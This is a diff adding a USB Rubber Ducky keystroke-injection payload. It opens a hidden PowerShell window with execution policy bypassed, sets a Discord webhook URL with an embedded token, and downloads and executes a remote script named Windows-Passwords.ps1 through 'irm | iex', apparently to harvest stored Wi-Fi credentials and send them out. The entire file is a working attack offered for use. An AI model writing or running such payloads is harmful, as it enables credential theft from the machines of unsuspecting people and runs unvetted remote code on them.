@@ -1,0 +1,12 @@
+DELAY 2000
+GUI r
+DELAY 250
+STRING powershell -w h -ep bypass $discord='
+
+REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE DISCORD https://discord.com/api/webhooks/1163054013764354070/sqBGY4atsyUZ4r02mGZtfLMbEv60J7_6fAhc2QLulpNNx7PgDl3z6f1yrZkpleiklMyK
+STRING DISCORD
+
+REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
+DEFINE PAYLOAD https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/credentials/WLAN-Windows-Passwords/Windows-Passwords.ps1
+STRINGLN ';irm PAYLOAD | iex
